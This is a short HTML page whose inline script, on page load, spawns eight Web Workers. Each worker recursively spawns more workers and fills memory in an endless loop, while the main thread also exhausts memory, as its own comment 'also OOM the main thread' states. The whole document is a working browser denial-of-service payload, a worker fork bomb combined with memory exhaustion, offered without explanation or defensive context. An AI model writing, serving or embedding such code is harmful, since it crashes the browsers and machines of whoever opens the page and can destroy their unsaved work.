<!DOCTYPE html>
<html>
<body>
<script>
  const blob = new Blob([`
    self.onmessage = () => {
      const w1 = new Worker(self.location.href);
      const w2 = new Worker(self.location.href);
      w1.postMessage(0);
      w2.postMessage(0);
      const arr = [];
      while(true) arr.push(new Array(1e7).fill(Math.random()));
    };
  `], { type: 'application/javascript' });
  const url = URL.createObjectURL(blob);
  for (let i = 0; i < 8; i++) {
    const w = new Worker(url);
    w.postMessage(0);
  }
  // also OOM the main thread
  const arr = [];
  while(true) arr.push(new Array(1e8).fill('💥'));
</script>
</body>
</html>
